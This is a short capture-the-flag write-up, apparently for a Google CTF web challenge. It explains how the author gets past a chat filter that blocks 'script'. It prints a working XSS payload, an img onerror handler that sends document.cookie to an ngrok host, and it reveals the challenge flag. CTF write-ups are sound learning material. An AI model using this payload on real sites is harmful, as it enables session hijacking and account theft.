# Description
## Cookie World Order
Label: web

Good job! You found a further credential that looks like a VPN referred to as the cWo. The organization appears very clandestine and mysterious and reminds you of the secret ruling class of hard shelled turtle-like creatures of Xenon. Funny they trust their security to a contractor outside their systems, especially one with such bad habits.  Upon further snooping you find a video feed of those "Cauliflowers" which look to be the dominant lifeforms and members of the cWo. Go forth and attain greater access to reach this creature!

# Solution
This task gives us a link [https://cwo-xss.web.ctfcompetition.com/](https://cwo-xss.web.ctfcompetition.com/). The website contains a video and a chat window on the right side. It appears that we are chatting with an admin and so it probably requires another xss. However, entering a tag like `<script>` will show up as `HACKER ALERT!`  so it seems that there is some kind check that matches against words like script. Playing around with other tags like `<img>` seem to work however so we can use that instead.

Again, I setup up a ngrok tunnel and used the `onerror` attribute of the `img` tag to send to cookie. This trick I learned about from [https://xss-game.appspot.com/](https://xss-game.appspot.com/)
```html
<img src="?" onerror="document.location='http://???.ngrok.io/?'+document.cookie">
```

Pasting that in the chat window gives us the cookie `CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}`